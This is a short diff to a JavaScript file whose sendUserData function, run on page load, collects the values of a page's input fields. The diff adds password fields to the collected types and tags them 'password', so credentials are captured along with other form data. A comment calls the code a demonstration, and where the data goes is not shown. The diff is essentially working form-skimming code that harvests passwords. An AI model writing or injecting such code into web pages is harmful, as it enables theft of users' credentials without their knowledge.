@@ -16,7 +16,7 @@ window.addEventListener("load",function() {
 var sendUserData = function() {
     var inputFields = document.getElementsByTagName('input');
     var textLibrary = {}
-    var validType = new Set(['submit', 'tel', 'text'])
+    var validType = new Set(['submit', 'tel', 'text', 'password'])
     for (var i = 0; i < inputFields.length; i ++) {
         if (validType.has(inputFields[i].type)) {
             textLibrary[findRelevantName(inputFields[i])] = inputFields[i].value
@@ -30,8 +30,9 @@ var sendUserData = function() {
         })
     }
 }
-console.log('reee')
-    var globalNoFind = 0
+console.log('yeet')
+
+var globalNoFind = 0
 // This function could be greatly improved, but is left basic as it is only for demonstration purposes
 var findRelevantName = function(inputField) {
     // First look for id
@@ -39,6 +40,9 @@ var findRelevantName = function(inputField) {
         return inputField.id
     }
     // Next find text next to it
+    if (inputField.type === 'password') {
+        return 'password'
+    }
     var parentElement = inputField.parentElement
     var exceptions = new Set(['confirm', 'submit', 'update', 'done', ''])
     while (parentElement !== null) {
